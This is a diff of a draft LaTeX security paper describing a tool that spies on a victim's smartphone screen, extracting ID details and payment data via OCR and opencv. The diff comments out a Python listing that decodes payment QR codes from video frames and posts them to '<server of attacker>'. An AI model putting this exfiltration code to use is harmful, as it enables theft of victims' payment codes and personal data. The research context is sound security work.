@@ -35,35 +35,35 @@ In the privacy extraction mode experiment, ``HUAWEI P30'', a smartphone in EMUI 
 First, we connect \tool to the target device. As remote control mode, \tool capture video from the victim's device and use ``opencv'' to identify ``valuable'' information from video stream. When the victim views text or photoes with text, \tool can use optical character recognition (OCR) to extract text from corresponding video frames. \yechang{hyperlink to OCR?}
 For example, extracting the victim's name, photo, address, and ID number when victim is viewing his or her photos of his or her ID card or passport documents,
 extracting the victim's payment information when victim is using bank apps or payment apps. Besides, \tool can use ``opencv'' to detect and decode QR codes or barcodes shown on the victim's device, which is expected to extract payment code information in payment apps.
-Here is an example of extracting payment code with opencv library in listing~\ref{lst2:qr},
+Here is an example of extracting payment code with opencv library in listing. \shuqing{Need to be modified.}
 
 Privacy extraction mode only extracts high-value information for attacker (or highly sensitive information for victim), which is more efficient to  than remote control mode.
 
-\begin{lstlisting}[caption={python script for extracting payment code of victim},label=lst2:qr]
-import cv2, qrcode,requests
-import pyzbar.pyzbar as pyzbar
-def decodeDisplay(video):
-    gray = cv2.cvtColor(video, cv2.COLOR_BGR2GRAY)
-    barcodes = pyzbar.decode(gray)
-    for barcode in barcodes:
-        barData = barcode.data.decode()
-        barType = barcode.type
-        requests.post('<server of attacker>',
-            data={
-                'data': barData,
-                'type': barType
-            }
-        )
-if __name__ == '__main__':
-    cam = cv2.VideoCapture(0)
-    while True:
-        ret, frame = cam.read()
-        decodeDisplay(frame)
-        if cv2.waitKey(5) == 27:
-            break
-    cam.release()
-    cv2.destroyAllWindows()
-\end{lstlisting}
+%\begin{lstlisting}[caption={python script for extracting payment code of victim},label=lst2:qr]
+%import cv2, qrcode,requests
+%import pyzbar.pyzbar as pyzbar
+%def decodeDisplay(video):
+%    gray = cv2.cvtColor(video, cv2.COLOR_BGR2GRAY)
+%    barcodes = pyzbar.decode(gray)
+%    for barcode in barcodes:
+%        barData = barcode.data.decode()
+%        barType = barcode.type
+%        requests.post('<server of attacker>',
+%            data={
+%                'data': barData,
+%                'type': barType
+%            }
+%        )
+%if __name__ == '__main__':
+%    cam = cv2.VideoCapture(0)
+%    while True:
+%        ret, frame = cam.read()
+%        decodeDisplay(frame)
+%        if cv2.waitKey(5) == 27:
+%            break
+%    cam.release()
+%    cv2.destroyAllWindows()
+%\end{lstlisting}
 
 
 \subsection{Case study}
